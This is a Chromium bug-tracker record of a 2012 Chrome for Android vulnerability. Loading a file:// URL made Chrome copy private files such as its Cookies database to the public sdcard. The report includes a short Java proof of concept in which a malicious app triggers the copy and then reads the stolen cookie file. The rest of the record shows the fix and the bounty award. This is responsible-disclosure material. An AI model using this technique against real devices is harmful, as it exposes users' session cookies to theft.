# Security: Chrome for Android Download Function Information Disclosure

| Field | Value |
|-------|-------|
| **Issue ID** | [40064755](https://issues.chromium.org/issues/40064755) |
| **Status** | New |
| **Severity** | Unknown |
| **Priority** | P4 |
| **Component** | Unknown |
| **Reporter** | we...@gmail.com |
| **Assignee** | pa...@chromium.org |
| **Created** | 2012-08-25 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

Chrome for Android stores user's private information (such as  

Cookies) in several files. Other apps cannot directly read  

or write these files.

However, by making Chrome load these files, Chrome app puts  

these files to public space (sdcard) without asking the users  

whether they wish to do so.

This behavior allows malicious apps to steal local files.  

Online non-HTML contents may also be subject to the same  

attack because Chrome treats them in the same way.

Such behavior does not matter in PC world, but it does in  

Android world, because they are different in security model.

**VERSION**  

Chrome Version: Chrome for Android v18.0.1025123  

Operating System: confirmed on Android 4.0.4 (Samsung Galaxy Nexus)

**REPRODUCTION CASE**  

Below is a sample code of a malicious Android app that steals  

Chrome's Cookie file.

public void attack() {  

try {  

// Let Chrome app load its Cookies file, so that Chrome app  

// automatically saves it to /sdcard/Download/ directory.  

Intent intent = new Intent("android.intent.action.VIEW");  

intent.setClassName("com.android.chrome",  

"com.google.android.apps.chrome.Main");  

String url = "file:///data/data/com.android.chrome/app\_chrome/Default/Cookies"  

intent.setData(Uri.parse(url));  

startActivity(intent);

```
    // Wait a few seconds  
    Thread.sleep(3000);  

    // Read Chrome's Cookie file in /sdcard/Download/Cookies.bin  
    FileInputStream fis = new FileInputStream("/sdcard/Download/Cookies.bin");  
    ...  
}  

```

}

NOTE  

This issue was initially reported to [security@google.com](mailto:security@google.com) on Jul. 8  

2012, but recently I heard from Google security team that the issue  

might not be filed in Chromium bug database. So now I re-submit  

the issue here which should be a legitimate place for reporting  

Chrome bugs.

## Timeline

### js...@chromium.org (2012-08-26)

@palmer - I believe these are fixed on their trunk but you'd know best.

### pa...@google.com (2012-08-27)

This is a duplicate of http://code.google.com/p/chromium/issues/detail?id=138210, which has been fixed in the upcoming release.

### sc...@gmail.com (2012-08-27)

[Empty comment from Monorail migration]

### pa...@google.com (2012-08-27)

Takeshi, even though we fixed and rewarded this bug to the reporter who reported it to us on 20 August, we are going to consider rewarding you as well, since it was a mistake on our end that we didn't get your report on 8 August. Thanks again for your good bug reports!

### we...@gmail.com (2012-09-08)

Oh, it's a good news for me that you are considering rewards :) Anyway, thanks Palmer and people involved for taking this report (and my other reports) seriously.

### pa...@chromium.org (2012-09-12)

[Empty comment from Monorail migration]

### pa...@chromium.org (2012-09-13)

And here's another $500. Thanks again Takeshi, and we apologize again for missing your first report.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### bu...@chromium.org (2012-10-14)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### sc...@gmail.com (2012-10-16)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-01-18)

Restrict-View-EditIssue is preferred since it allows anyone who can edit an issue (committers and contributors) to view the bug.

### bu...@chromium.org (2013-01-18)

Restrict-View-EditIssue is preferred since it allows anyone who can edit an issue (committers and contributors) to view the bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-11)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/144820?no_tracker_redirect=1

[Monorail mergedinto: crbug.com/chromium/138210]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40064755)*
